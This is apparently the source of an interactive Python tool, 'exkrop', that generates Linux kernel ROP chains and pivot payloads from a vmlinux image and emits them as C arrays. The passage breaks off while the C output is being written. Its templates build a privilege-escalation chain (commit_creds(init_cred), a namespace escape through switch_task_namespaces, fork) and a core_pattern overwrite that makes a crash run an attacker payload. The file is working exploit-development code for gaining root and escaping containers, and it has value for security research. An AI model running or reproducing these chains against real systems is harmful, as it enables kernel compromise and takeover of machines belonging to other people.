"""exkrop — Interactive kernel ROP chain generator.

Usage: PYTHONPATH=. python3 -m exkrop <vmlinux>
"""

import struct
import sys

from elftools.elf.elffile import ELFFile
from Exrop import Exrop

PAGE_SIZE = 10
PIVOT_REGISTERS = [
    'rdi', 'rsi', 'rdx', 'rcx', 'rbx', 'rbp',
    'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15',
]


# ── Symbol resolution ────────────────────────────────────────────────

def resolve_symbols(vmlinux_path, names):
    """Read symbol addresses from the vmlinux ELF .symtab section."""
    symbols = {}
    with open(vmlinux_path, 'rb') as f:
        elf = ELFFile(f)
        symtab = elf.get_section_by_name('.symtab')
        if symtab is None:
            raise ValueError("No .symtab section found in {}".format(vmlinux_path))
        needed = set(names)
        for sym in symtab.iter_symbols():
            if sym.name in needed:
                symbols[sym.name] = sym['st_value']
                needed.discard(sym.name)
                if not needed:
                    break
    missing = set(names) - set(symbols)
    if missing:
        raise ValueError("Symbols not found: {}".format(', '.join(sorted(missing))))
    return symbols


def get_kernel_base(vmlinux_path):
    """Extract kernel text base address.

    Tries _text / _stext symbols first (reliable even for KASLR/PIE kernels
    where PT_LOAD vaddr is 0), then falls back to lowest non-zero PT_LOAD.
    """
    with open(vmlinux_path, 'rb') as f:
        elf = ELFFile(f)
        # Try well-known symbols
        symtab = elf.get_section_by_name('.symtab')
        if symtab is not None:
            for sym in symtab.iter_symbols():
                if sym.name in ('_text', '_stext') and sym['st_value'] != 0:
                    return sym['st_value']
        # Fallback: lowest non-zero PT_LOAD vaddr
        base = None
        for seg in elf.iter_segments():
            if seg.header['p_type'] == 'PT_LOAD':
                vaddr = seg.header['p_vaddr']
                if vaddr != 0 and (base is None or vaddr < base):
                    base = vaddr
        if base is not None:
            return base
        raise ValueError("Cannot determine kernel base from {}".format(vmlinux_path))


# ── Prompt helpers ───────────────────────────────────────────────────

def prompt_choice(text, valid_range):
    """Prompt for an integer in valid_range (inclusive). Returns the int."""
    lo, hi = valid_range
    while True:
        try:
            raw = input("{} [{}-{}]: ".format(text, lo, hi)).strip()
            val = int(raw)
            if lo <= val <= hi:
                return val
            print("  Please enter a number between {} and {}.".format(lo, hi))
        except ValueError:
            print("  Invalid number.")
        except EOFError:
            sys.exit(0)


def prompt_string(text, default=None):
    """Prompt for a string with optional default."""
    suffix = " [{}]: ".format(default) if default else ": "
    try:
        raw = input(text + suffix).strip()
        return raw if raw else (default or "")
    except EOFError:
        sys.exit(0)


def prompt_yn(text, default=True):
    """Prompt yes/no. Returns bool."""
    hint = "Y/n" if default else "y/N"
    try:
        raw = input("{} [{}]: ".format(text, hint)).strip().lower()
        if not raw:
            return default
        return raw in ('y', 'yes')
    except EOFError:
        sys.exit(0)


# ── Pivot chooser ───────────────────────────────────────────────────

def _pivot_summary(pivot, idx):
    """One-line summary for a pivot."""
    addr = pivot.gadget_addr
    ptype = pivot.pivot_type
    if ptype in ('jop', 'jop_indirect', 'jop_push'):
        gadget_str = str(pivot.jop_chain[0][0])
        chain_off = pivot.chain_offset_computed
    else:
        gadget_str = str(pivot.gadget)
        chain_off = pivot.offset
    if ptype in ('indirect', 'jop_indirect'):
        label = "ptr at"
    else:
        label = "chain at"
    return "  [{:>2d}] {:<14s} @ 0x{:x} # {} ({} +0x{:x})".format(
        idx, ptype, addr, gadget_str, label, chain_off)


def choose_pivot(pivots):
    """Paginated pivot chooser. Returns selected PivotInfo or None."""
    total = len(pivots)
    page = 0
    max_page = (total - 1) // PAGE_SIZE

    while True:
        start = page * PAGE_SIZE
        end = min(start + PAGE_SIZE, total)
        print("\n--- Pivot candidates ({}-{} of {}) ---".format(
            start + 1, end, total))
        for i in range(start, end):
            print(_pivot_summary(pivots[i], i + 1))

        nav = []
        if page < max_page:
            nav.append("[n] Next page")
        if page > 0:
            nav.append("[p] Previous page")
        nav.append("[d N] Details")
        nav.append("[q] Quit")
        print("  " + "  ".join(nav))

        try:
            raw = input("\nSelect pivot: ").strip().lower()
        except EOFError:
            return None

        if raw == 'q':
            return None
        if raw == 'n' and page < max_page:
            page += 1
            continue
        if raw == 'p' and page > 0:
            page -= 1
            continue
        if raw.startswith('d '):
            try:
                n = int(raw[2:])
                if 1 <= n <= total:
                    print()
                    pivots[n - 1].dump()
                else:
                    print("  Out of range.")
            except ValueError:
                print("  Invalid number.")
            continue
        try:
            n = int(raw)
            if 1 <= n <= total:
                return pivots[n - 1]
            print("  Out of range.")
        except ValueError:
            print("  Invalid input.")


# ── C code generators ───────────────────────────────────────────────

def _is_kernel_addr(val, kern_base):
    """Check if a value is a kernel address (>= kern_base)."""
    return kern_base and val >= kern_base


_VAL_WIDTH = 22  # len("0x0000000000000000ULL")


def _fmt_val(val, kern_base):
    """Format a value as KERN(offset) or plain hex literal."""
    if _is_kernel_addr(val, kern_base):
        return "KERN(0x{:x})".format(val - kern_base)
    return "0x{:016x}ULL".format(val)


def _fmt_val_padded(val, kern_base):
    """Format a value padded to fixed width for aligned array output."""
    return "{:<{w}}".format(_fmt_val(val, kern_base), w=_VAL_WIDTH)


def pivot_to_c_comment(pivot, kern_base):
    """Generate a C comment block describing the pivot gadget."""
    lines = ["/*"]
    lines.append(" * Pivot type: {}".format(pivot.pivot_type))
    lines.append(" * Source register: {}".format(pivot.src_reg))

    if pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push'):
        for i, (g, off) in enumerate(pivot.jop_chain):
            lines.append(" * Step {}: {} @ {}".format(
                i + 1, _fmt_val(g.addr, kern_base), g))
        lines.append(" * Pivot: {} @ {}".format(
            _fmt_val(pivot.pivot_gadget.addr, kern_base), pivot.pivot_gadget))
        for off, addr in pivot.dispatch_entries:
            lines.append(" * Dispatch: place {} at [{}+0x{:x}]".format(
                _fmt_val(addr, kern_base), pivot.src_reg, off))
        if pivot.pivot_type == 'jop_indirect':
            lines.append(" * Place ROP chain address at [{}+0x{:x}]".format(
                pivot.src_reg, pivot.chain_offset_computed))
        else:
            lines.append(" * ROP chain starts at [{}+0x{:x}]".format(
                pivot.src_reg, pivot.chain_offset_computed))
    else:
        lines.append(" * Gadget: {} @ {}".format(
            _fmt_val(pivot.gadget_addr, kern_base), pivot.gadget))
        if pivot.offset:
            lines.append(" * Offset: 0x{:x}".format(pivot.offset))
        if pivot.is_indirect:
            lines.append(" * Place ROP chain address at [{}+0x{:x}]".format(
                pivot.src_reg, pivot.offset))
        elif pivot.offset:
            lines.append(" * ROP chain starts at [{}+0x{:x}]".format(
                pivot.src_reg, pivot.offset))
        else:
            lines.append(" * ROP chain starts at [{}]".format(pivot.src_reg))

    lines.append(" */")
    return "\n".join(lines)


def ropchain_to_c_array(rop_chain, symbol_map, var_name, kern_base,
                        pivot_offset=0):
    """Render a RopChain as a standalone C uint64_t array.

    Used for indirect pivots where the chain lives at a separate known
    address rather than inline in the exploit object.

    pivot_offset: bytes of padding consumed by pivot's extra pops before
    ret (e.g., pop r13; pop r14; pop r15 = 24 bytes).  Prepends junk
    entries so ret lands on the first real gadget.
    """
    all_items = []
    for c in rop_chain.chains:
        all_items.extend(c.get_chains())
    if rop_chain.next_call:
        all_items.extend(rop_chain.next_call.get_chains())

    lines = []
    lines.append("uint64_t {}[] = {{".format(var_name))
    # Prepend padding for pivot's extra pops
    for i in range(0, pivot_offset, 8):
        lines.append("    {}, // padding (pivot pop)".format(
            _fmt_val_padded(0, kern_base)))
    for i, item in enumerate(all_items):
        val = item.getValue(rop_chain.base_addr)
        comment = item.comment
        if not comment and val in symbol_map:
            comment = symbol_map[val]
        suffix = " // {}".format(comment) if comment else ""
        lines.append("    {},{}".format(_fmt_val_padded(val, kern_base), suffix))
    lines.append("};")
    return "\n".join(lines)


def payload_to_c_struct(payload_dict, rop_chain, pivot, symbol_map,
                        var_name, kern_base, used_dispatch=None,
                        shift_info=None):
    """Convert pivot.build_payload() result to C uint64_t array with #defines.

    Embeds per-gadget comments from the RopChain into the object layout.
    Annotates reserved offsets and shift gadgets when present.

    For indirect pivots, the chain is NOT embedded — only dispatch entries
    and the pointer slot are included.  The chain goes in a separate array.
    """
    is_indirect = pivot.pivot_type in ('indirect', 'jop_indirect')

    obj = payload_dict['obj_layout']
    chain_offset = payload_dict['chain_offset']
    func_ptr = payload_dict['func_ptr']
    dispatch = payload_dict.get('dispatch_entries', [])
    ptr_offset = payload_dict.get('ptr_offset')

    defines = []
    defines.append("#define PIVOT_GADGET {}".format(_fmt_val(func_ptr, kern_base)))
    defines.append("#define OBJ_SIZE     0x{:x}".format(len(obj)))
    if is_indirect:
        defines.append("#define CHAIN_ADDR   0xDEADBEEFULL  // TODO: set to rop_chain address")
        defines.append("#define PTR_OFFSET   0x{:x}".format(ptr_offset))
    else:
        defines.append("#define CHAIN_OFFSET 0x{:x}".format(chain_offset))
        if ptr_offset is not None:
            defines.append("#define PTR_OFFSET   0x{:x}".format(ptr_offset))
    for i, (off, addr) in enumerate(dispatch):
        defines.append("#define DISPATCH_{}_OFFSET 0x{:x}".format(i, off))

    # Build annotation map: offset -> description
    annotations = {}
    if is_indirect:
        annotations[ptr_offset] = "pointer to chain -> CHAIN_ADDR"
    else:
        annotations[chain_offset] = "ROP chain start"
        if ptr_offset is not None:
            annotations[ptr_offset] = "pointer to chain"
    for i, (off, addr) in enumerate(dispatch):
        annotations[off] = "dispatch[{}] -> {}".format(i, _fmt_val(addr, kern_base))

    # Annotate reserved offsets
    if used_dispatch:
        for off in used_dispatch:
            if off not in annotations:
                annotations[off] = "RESERVED"

    # Annotate shift gadgets
    shift_offsets = {}
    if shift_info:
        for s_off, s_gad, s_bytes in shift_info:
            shift_offsets[s_off] = (s_gad, s_bytes)

    # Build chain item comment map from the RopChain (only for inline chains).
    chain_comments = {}
    if not is_indirect:
        all_items = []
        for c in rop_chain.chains:
            all_items.extend(c.get_chains())
        if rop_chain.next_call:
            all_items.extend(rop_chain.next_call.get_chains())

        if shift_info:
            segments = []
            for c in rop_chain.chains:
                segments.append(c.get_chains())
            if rop_chain.next_call:
                segments.append(rop_chain.next_call.get_chains())
            cur_off = chain_offset
            for seg_items in segments:
                if cur_off in shift_offsets:
                    s_gad, s_bytes = shift_offsets[cur_off]
                    chain_comments[cur_off] = "shift: {} (skip 0x{:x})".format(
                        str(s_gad), s_bytes)
                    cur_off += 8 + s_bytes
                for item in seg_items:
                    comment = item.comment
                    val = item.getValue(rop_chain.base_addr)
                    if not comment and val in symbol_map:
                        comment = symbol_map[val]
                    if comment:
                        chain_comments[cur_off] = comment
                    cur_off += 8
        else:
            for i, item in enumerate(all_items):
                item_off = chain_offset + i * 8
                comment = item.comment
                val = item.getValue(rop_chain.base_addr)
                if not comment and val in symbol_map:
                    comment = symbol_map[val]
                if comment:
                    chain_comments[item_off] = comment

    # Find last non-zero qword (for indirect, stop at dispatch/pointer area)
    last_nonzero = 0
    if is_indirect:
        # Only emit up to the last dispatch/pointer/reserved slot
        slots = set()
        for off, _ in dispatch:
            slots.add(off)
        if ptr_offset is not None:
            slots.add(ptr_offset)
        if used_dispatch:
            slots.update(used_dispatch)
        last_nonzero = max(slots) if slots else 0
    else:
        for off in range(0, len(obj), 8):
            qword = struct.unpack_from('<Q', obj, off)[0]
            if qword:
                last_nonzero = off

    lines = defines + [""]
    lines.append("uint64_t {}[] = {{".format(var_name))
    for off in range(0, last_nonzero + 8, 8):
        qword = struct.unpack_from('<Q', obj, off)[0]
        # For indirect pivots, show CHAIN_ADDR at the pointer slot
        if is_indirect and off == ptr_offset:
            val_str = "{:<{w}}".format("CHAIN_ADDR", w=_VAL_WIDTH)
        else:
            val_str = _fmt_val_padded(qword, kern_base)
        parts = []
        parts.append("+0x{:02x}".format(off))
        if off in annotations:
            parts.append(annotations[off])
        if off in chain_comments:
            parts.append(chain_comments[off])
        elif off not in annotations and qword in symbol_map:
            parts.append(symbol_map[qword])
        comment = " | ".join(parts)
        lines.append("    {}, // {}".format(val_str, comment))
    lines.append("};")
    return "\n".join(lines)


# ── Pivot side-effect extraction ─────────────────────────────────────

import re

_PIVOT_MEM_DEST_RE = re.compile(
    r'(?:add|sub|or|xor|and|mov|adc|sbb|inc|dec|not|neg)\s+'
    r'\w+\s+ptr\s+\[([^\]]+)\]')

def _extract_side_effect_offsets(pivot, src_reg):
    """Extract qword-aligned offsets written by side-effect memory ops in pivot gadgets.

    Scans all gadgets in the pivot chain (JOP steps + pivot gadget, or the
    direct gadget) for memory writes targeting [src_reg + offset].

    Returns a set of qword-aligned offsets.
    """
    # Collect all register name variants that alias to src_reg
    variants = {src_reg}
    _VARIANTS = {
        'rax': {'al', 'ah', 'ax', 'eax', 'rax'},
        'rbx': {'bl', 'bh', 'bx', 'ebx', 'rbx'},
        'rcx': {'cl', 'ch', 'cx', 'ecx', 'rcx'},
        'rdx': {'dl', 'dh', 'dx', 'edx', 'rdx'},
        'rdi': {'dil', 'di', 'edi', 'rdi'},
        'rsi': {'sil', 'si', 'esi', 'rsi'},
        'rbp': {'bp', 'ebp', 'rbp'},
        'r8':  {'r8b', 'r8w', 'r8d', 'r8'},
        'r9':  {'r9b', 'r9w', 'r9d', 'r9'},
        'r10': {'r10b', 'r10w', 'r10d', 'r10'},
        'r11': {'r11b', 'r11w', 'r11d', 'r11'},
        'r12': {'r12b', 'r12w', 'r12d', 'r12'},
        'r13': {'r13b', 'r13w', 'r13d', 'r13'},
        'r14': {'r14b', 'r14w', 'r14d', 'r14'},
        'r15': {'r15b', 'r15w', 'r15d', 'r15'},
    }
    if src_reg in _VARIANTS:
        variants = _VARIANTS[src_reg]

    # Collect all gadgets involved in the pivot
    gadgets = []
    if pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push'):
        for g, _ in pivot.jop_chain:
            gadgets.append(g)
        if pivot.pivot_gadget:
            gadgets.append(pivot.pivot_gadget)
    else:
        gadgets.append(pivot.gadget)

    offsets = set()
    for gadget in gadgets:
        for inst in gadget.insstr.split(';'):
            m = _PIVOT_MEM_DEST_RE.search(inst.strip())
            if not m:
                continue
            addr_expr = m.group(1).strip()
            # Check if the base register is a variant of src_reg
            # e.g. "rbx + 0x41" where rbx aliases src_reg
            parts = re.split(r'\s*[+-]\s*', addr_expr)
            if not parts or parts[0] not in variants:
                continue
            # Extract offset
            off_match = re.search(r'[+-]\s*(?:0x)?([0-9a-fA-F]+)', addr_expr)
            if off_match:
                sign = -1 if '-' in addr_expr[:addr_expr.index(off_match.group(1))] else 1
                off = sign * int(off_match.group(1), 16)
            else:
                off = 0
            if off >= 0:
                offsets.add(off & ~7)  # qword-align
    return offsets


# ── Patched payload builder ──────────────────────────────────────────

def build_patched_payload(e, rop_chain, pivot, occupied, obj_size=0x100):
    """Build exploit object, inserting shift gadgets to skip occupied offsets.

    Shift gadgets are inserted at Chain boundaries (ret-landing positions)
    so `add rsp, N; ret` correctly hops over the occupied region.

    Args:
        occupied: Dict {offset: value} of all occupied slots (user-reserved
                  AND JOP dispatch entries, already merged by caller).

    Returns (payload_dict, shift_info) where shift_info is a list of
    (obj_offset, shift_gadget, skip_bytes) tuples, or [] if no patching.
    """
    chain_off = (pivot.chain_offset_computed
                 if pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push')
                 else pivot.offset)

    # Collect Chain segments: each is a list of ChainItems from one Chain.
    # A ret-landing position is at the start of each segment.
    segments = []
    for c in rop_chain.chains:
        segments.append(c.get_chains())
    if rop_chain.next_call:
        segments.append(rop_chain.next_call.get_chains())

    occupied_set = set(occupied)

    def _find_shift_gadget(skip_bytes):
        """Find a shift gadget with diff_sp == skip_bytes (or slightly larger)."""
        shifts = e.find_stack_shift(skip_bytes)
        if shifts:
            return shifts[0], skip_bytes
        for extra in range(8, 0x41, 8):
            shifts = e.find_stack_shift(skip_bytes + extra)
            if shifts:
                return shifts[0], skip_bytes + extra
        return None, skip_bytes

    def _next_clean_after(off):
        """Find the next qword-aligned offset at or after `off` that is not occupied."""
        while off in occupied_set:
            off += 8
        return off

    # Build patched layout: walk segments, inserting shifts at boundaries.
    #
    # At each ret-landing (= start of segment placement), look ahead:
    # will any occupied slot fall within the segment's range?
    # If so, insert a shift gadget BEFORE the segment to jump past
    # the occupied region, then place the segment at the clean position.
    #
    # Each entry: ('chain', items) or ('shift', gadget, skip_bytes)
    layout = []
    shift_info = []
    current_off = chain_off

    for seg_idx, seg_items in enumerate(segments):
        seg_bytes = len(seg_items) * 8
        is_last_seg = (seg_idx == len(segments) - 1)

        # Ensure current_off is not occupied before placing anything.
        # If the ret-landing after the previous segment is occupied,
        # insert a shift to jump past the occupied region first.
        while current_off in occupied_set:
            clean_resume = _next_clean_after(current_off)
            # diff_sp = clean_resume - current_off
            # But we can't place the shift AT current_off (it's occupied).
            # We need to retroactively extend the previous shift or segment.
            # Solution: the previous layout entry must have left room.
            # If previous entry is a shift, extend its skip.
            # Otherwise, append a shift to the previous segment's last slot.
            if layout and layout[-1][0] == 'shift':
                # Extend the previous shift to cover more
                _, prev_gad, prev_skip = layout[-1]
                extra = clean_resume - current_off
                new_skip = prev_skip + extra
                new_gad, actual_skip = _find_shift_gadget(new_skip)
                if new_gad:
                    layout[-1] = ('shift', new_gad, actual_skip)
                    old_info = shift_info[-1]
                    shift_info[-1] = (old_info[0], new_gad, actual_skip)
                    current_off = old_info[0] + 8 + actual_skip
                else:
                    print("  Warning: no shift gadget for 0x{:x} bytes "
                          "at offset 0x{:x}".format(new_skip, old_info[0]))
                    current_off = clean_resume
                    break
            else:
                # No previous shift to extend. This means the chain_off itself
                # is occupied — insert a shift gadget that overwrites the slot
                # (unavoidable; user should pick a different pivot).
                needed_skip = clean_resume - current_off
                gadget, actual_skip = _find_shift_gadget(needed_skip)
                if gadget:
                    layout.append(('shift', gadget, actual_skip))
                    shift_info.append((current_off, gadget, actual_skip))
                    current_off += 8 + actual_skip
                else:
                    print("  Warning: no shift gadget for 0x{:x} bytes "
                          "at offset 0x{:x}".format(needed_skip, current_off))
                    current_off = clean_resume
                    break

        # Now insert shifts until the segment fits without hitting occupied slots
        while True:
            conflict = None
            for off in range(current_off, current_off + seg_bytes, 8):
                if off in occupied_set:
                    conflict = off
                    break

            # Also check post-segment ret-landing position: if the
            # slot right after this segment is occupied, the last ret
            # would jump into a reserved value instead of the next gadget.
            if conflict is None and not is_last_seg:
                post_off = current_off + seg_bytes
                if post_off in occupied_set:
                    conflict = post_off

            if conflict is None:
                break  # segment fits cleanly

            # Shift from current_off to past the occupied region
            clean_resume = _next_clean_after(conflict)
            needed_skip = clean_resume - current_off - 8
            if needed_skip < 8:
                needed_skip = 8

            gadget, actual_skip = _find_shift_gadget(needed_skip)
            if gadget:
                layout.append(('shift', gadget, actual_skip))
                shift_info.append((current_off, gadget, actual_skip))
                current_off += 8 + actual_skip
            else:
                print("  Warning: no shift gadget for 0x{:x} bytes "
                      "at offset 0x{:x}, conflict at 0x{:x}".format(
                          needed_skip, current_off, conflict))
                break

        layout.append(('chain', seg_items))
        current_off += seg_bytes

    # Build the object
    final_obj_size = max(obj_size, current_off + 0x40)
    obj = bytearray(final_obj_size)

    # Write the layout into the object
    write_off = chain_off
    for entry in layout:
        if entry[0] == 'shift':
            _, gadget, skip_bytes = entry
            struct.pack_into('<Q', obj, write_off, gadget.addr)
            write_off += 8 + skip_bytes
        else:
            _, items = entry
            for item in items:
                val = item.getValue(rop_chain.base_addr)
                struct.pack_into('<Q', obj, write_off, val)
                write_off += 8

    # Place dispatch entries on top
    if pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push'):
        for off, addr in pivot.dispatch_entries:
            if 0 <= off < final_obj_size:
                struct.pack_into('<Q', obj, off, addr)

    # Place occupied values on top (reserved slots preserved)
    for off, val in occupied.items():
        if 0 <= off < final_obj_size:
            struct.pack_into('<Q', obj, off, val)

    payload_dict = {
        'func_ptr': pivot.gadget_addr,
        'obj_layout': bytes(obj),
        'chain_offset': chain_off,
        'description': "Place ROP chain at object+0x{:x}".format(chain_off),
    }
    if pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push'):
        payload_dict['dispatch_entries'] = list(pivot.dispatch_entries)
    if pivot.is_indirect:
        payload_dict['ptr_offset'] = pivot.offset

    return payload_dict, shift_info


# ── Templates ────────────────────────────────────────────────────────

def _build_privesc(e, syms):
    """Privilege escalation: creds + namespace escape + fork + sleep."""
    print("[*] commit_creds(init_cred)")
    chain = e.func_call(syms['commit_creds'], (syms['init_cred'],))
    chain.dump()

    print("[*] find_task_by_vpid(1)")
    chain2 = e.func_call(syms['find_task_by_vpid'], (1,))
    chain.merge_ropchain(chain2)
    chain2.dump()

    print("[*] switch_task_namespaces(rax, init_nsproxy)")
    chain3 = e.func_call(syms['switch_task_namespaces'],
                         ('rax', syms['init_nsproxy']))
    chain.merge_ropchain(chain3)
    chain3.dump()

    print("[*] fork(0)")
    chain4 = e.func_call(syms['__x64_sys_fork'], (0,))
    chain.merge_ropchain(chain4)
    chain4.dump()

    print("[*] msleep(1000000000)")
    chain5 = e.func_call(syms['msleep'], (1000000000,))
    chain.merge_ropchain(chain5)
    chain5.dump()

    return chain


def _build_core_pattern(e, syms):
    """Overwrite core_pattern via copy_from_user + sleep."""
    pattern = prompt_string("Core pattern string", "|/proc/%P/fd/666 %P")
    user_addr_str = prompt_string("User-space buffer address (hex)",
                                  "0x4141414141414141")
    try:
        user_addr = int(user_addr_str, 16)
    except ValueError:
        print("Invalid hex address.")
        sys.exit(1)

    pattern_bytes = pattern.encode() + b'\x00'
    length = len(pattern_bytes)

    print("[*] _copy_from_user(core_pattern, 0x{:x}, {})".format(user_addr, length))
    chain = e.func_call(syms['_copy_from_user'],
                        (syms['core_pattern'], user_addr, length))
    chain.dump()

    print("[*] msleep(1000000000)")
    chain2 = e.func_call(syms['msleep'], (1000000000,))
    chain.merge_ropchain(chain2)
    chain2.dump()

    return (chain,
            "// NOTE: place {:d} bytes at user address 0x{:x}:\n"
            "// char pattern[] = \"{}\";".format(length, user_addr, pattern),
            user_addr, pattern)


TEMPLATES = {
    1: {
        'name': 'Privilege Escalation',
        'description': 'commit_creds(init_cred) + namespace escape + fork + msleep',
        'symbols': [
            'commit_creds', 'init_cred',
            'find_task_by_vpid', 'switch_task_namespaces', 'init_nsproxy',
            '__x64_sys_fork', 'msleep',
        ],
        'build_fn': _build_privesc,
        'c_preamble': '// Privilege escalation: get root + escape namespaces',
    },
    2: {
        'name': 'core_pattern Overwrite',
        'description': '_copy_from_user(core_pattern, user_buf, len) + msleep',
        'symbols': ['_copy_from_user', 'core_pattern', 'msleep'],
        'build_fn': _build_core_pattern,
        'c_preamble': '// core_pattern overwrite: crash a child to trigger payload',
    },
}


# ── Main ─────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 -m exkrop <vmlinux>")
        sys.exit(1)

    vmlinux = sys.argv[1]

    # Load gadgets
    print("Loading {}...".format(vmlinux))
    e = Exrop(vmlinux)
    e.find_gadgets(cache=True, kernel_mode=True)
    e.clean_only = not prompt_yn("Include non-clean gadgets (side effects)?", default=False)
    print("Gadgets loaded.\n")

    # Template selection
    print("=== ROP Chain Templates ===")
    for tid, tpl in sorted(TEMPLATES.items()):
        print("  [{}] {} — {}".format(tid, tpl['name'], tpl['description']))
    template_id = prompt_choice("\nSelect template", (1, len(TEMPLATES)))
    template = TEMPLATES[template_id]

    # Resolve symbols and kernel base
    print("\nResolving kernel base...")
    try:
        kern_base = get_kernel_base(vmlinux)
    except ValueError as ex:
        print("Error: {}".format(ex))
        sys.exit(1)
    print("  Kernel base: 0x{:x}".format(kern_base))

    print("Resolving symbols...")
    try:
        syms = resolve_symbols(vmlinux, template['symbols'])
    except ValueError as ex:
        print("Error: {}".format(ex))
        sys.exit(1)
    for name, addr in sorted(syms.items()):
        print("  {:<30s} 0x{:x} (base + 0x{:x})".format(name, addr, addr - kern_base))

    # Build reverse symbol map for C annotations
    symbol_map = {addr: name for name, addr in syms.items()}

    # Build ROP chain
    print("\n=== Building ROP chain ===\n")
    try:
        result = template['build_fn'](e, syms)
    except Exception as ex:
        print("Chain build failed: {}".format(ex))
        sys.exit(1)

    # Unpack result — core_pattern returns a tuple
    extra_note = None
    if isinstance(result, tuple):
        chain, extra_note = result[0], result[1]
    else:
        chain = result

    print("\n=== Full ROP chain ===\n")
    chain.dump()

    # Pivot register selection
    print("=== Pivot Register ===")
    for i, reg in enumerate(PIVOT_REGISTERS, 1):
        print("  [{:>2d}] {}".format(i, reg))
    reg_idx = prompt_choice("\nSelect pivot source register", (1, len(PIVOT_REGISTERS)))
    pivot_reg = PIVOT_REGISTERS[reg_idx - 1]

    # Reserved object offsets (e.g. vtable pointer the kernel loads before dispatch)
    used_dispatch = {}
    raw_offsets = prompt_string(
        "Reserved object offsets (hex, comma-separated, e.g. 0x10,0x18 or 0x0-0x10)", "none")
    if raw_offsets.lower() != "none" and raw_offsets:
        for tok in raw_offsets.split(','):
            tok = tok.strip()
            if not tok:
                continue
            try:
                if '-' in tok:
                    parts = tok.split('-', 1)
                    lo = int(parts[0], 16) if parts[0].startswith('0x') else int(parts[0])
                    hi = int(parts[1], 16) if parts[1].startswith('0x') else int(parts[1])
                    for off in range(lo, hi + 1, 8):
                        used_dispatch[off] = 0
                else:
                    off = int(tok, 16) if tok.startswith('0x') else int(tok)
                    used_dispatch[off] = 0
            except ValueError:
                print("  Skipping invalid offset: {}".format(tok))
    if used_dispatch:
        print("  Reserved offsets: {}".format(
            ", ".join("0x{:x}".format(o) for o in sorted(used_dispatch))))

    # Find pivots
    print("\nSearching for pivots from {}...".format(pivot_reg))
    try:
        pivots = e.stack_pivot_reg(pivot_reg, used_dispatch=used_dispatch or None)
    except Exception as ex:
        print("Pivot search failed: {}".format(ex))
        sys.exit(1)

    if not pivots:
        print("No pivots found from {}.".format(pivot_reg))
        sys.exit(1)

    # Filter out inline pivots whose chain start lands on a reserved offset.
    # Indirect pivots are exempt (chain lives at a separate address).
    if used_dispatch:
        reserved_set = set(used_dispatch)
        before = len(pivots)
        filtered = []
        for p in pivots:
            if p.pivot_type in ('indirect', 'jop_indirect'):
                filtered.append(p)
                continue
            chain_off = (p.chain_offset_computed
                         if p.pivot_type in ('jop', 'jop_push')
                         else p.offset)
            # Merge dispatch entries with user-reserved offsets
            all_reserved = set(reserved_set)
            for off, _ in p.dispatch_entries:
                all_reserved.add(off)
            # Check if every slot in the chain region is occupied —
            # shift gadgets can skip some conflicts, but if the chain
            # start itself is reserved we can't place anything there.
            if chain_off in all_reserved:
                continue
            filtered.append(p)
        pivots = filtered
        dropped = before - len(pivots)
        if dropped:
            print("Filtered {} pivot(s) conflicting with reserved offsets.".format(dropped))

    # Ask whether to include indirect pivots
    has_indirect = any(p.pivot_type in ('indirect', 'jop_indirect')
                       for p in pivots)
    if has_indirect:
        if not prompt_yn("Include indirect pivots (require known object address)?",
                         default=False):
            pivots = [p for p in pivots
                      if p.pivot_type not in ('indirect', 'jop_indirect')]

    if not pivots:
        print("No non-indirect pivots found from {}.".format(pivot_reg))
        sys.exit(1)

    print("Found {} pivot(s).".format(len(pivots)))

    # Choose pivot
    pivot = choose_pivot(pivots)
    if pivot is None:
        print("No pivot selected.")
        sys.exit(0)

    print("\nSelected pivot:")
    pivot.dump()

    # Detect whether this is an indirect pivot (chain at separate address)
    is_indirect = pivot.pivot_type in ('indirect', 'jop_indirect')

    # Collect all occupied offsets: user-reserved + JOP dispatch entries
    all_occupied = dict(used_dispatch)
    if pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push'):
        for off, addr in pivot.dispatch_entries:
            all_occupied[off] = addr

    # Add side-effect write offsets from pivot gadgets
    side_effect_offs = _extract_side_effect_offsets(pivot, pivot_reg)
    if side_effect_offs:
        print("Pivot side-effect writes: {}".format(
            ", ".join("0x{:x}".format(o) for o in sorted(side_effect_offs))))
        for off in side_effect_offs:
            if off not in all_occupied:
                all_occupied[off] = 0

    if is_indirect:
        # Indirect: chain goes at a separate known address, not inline.
        # Object only holds dispatch entries + pointer slot.
        obj_size = 0x100
        payload = pivot.build_payload(chain, obj_size=obj_size)
        shift_info = []

        print("\n{}".format(payload['description']))
        print("Pointer offset: 0x{:x}".format(payload['ptr_offset']))
        print("Object size:    0x{:x} bytes".format(len(payload['obj_layout'])))
    else:
        # Inline: build payload with shift gadgets if needed
        chain_bytes = chain.payload_str()
        chain_off = (pivot.chain_offset_computed
                     if pivot.pivot_type in ('jop', 'jop_push')
                     else pivot.offset)
        chain_end = chain_off + len(chain_bytes)
        obj_size = max(0x100, chain_end + 0x40)

        conflicts = sorted(off for off in all_occupied
                            if chain_off <= off < chain_end)

        if conflicts:
            print("\nOccupied offsets within chain region: {}".format(
                ", ".join("0x{:x}".format(o) for o in conflicts)))
            for off in conflicts:
                if off in used_dispatch:
                    print("  0x{:x}: reserved by user".format(off))
                else:
                    print("  0x{:x}: JOP dispatch -> 0x{:x}".format(
                        off, all_occupied[off]))
            print("Inserting shift gadgets to skip occupied slots...")
            payload, shift_info = build_patched_payload(
                e, chain, pivot, all_occupied, obj_size)
            for s_off, s_gad, s_bytes in shift_info:
                print("  0x{:x}: {} (skip 0x{:x} bytes)".format(
                    s_off, s_gad, s_bytes))
        else:
            payload = pivot.build_payload(chain, obj_size=obj_size)
            shift_info = []

        print("\n{}".format(payload['description']))
        print("Chain offset: 0x{:x}".format(payload['chain_offset']))
        print("Object size:  0x{:x} bytes".format(len(payload['obj_layout'])))

    # Generate C output
    c_lines = []
    c_lines.append("#include <stdint.h>")
    c_lines.append("")
    c_lines.append("#define KERN_BASE 0x{:x}ULL".format(kern_base))
    c_lines.append("#define KERN(off) (KERN_BASE + (off))")
    c_lines.append("")
    c_lines.append(template['c_preamble'])
    if extra_note:
        c_lines.append("")
        c_lines.append(extra_note)
    c_lines.append("")
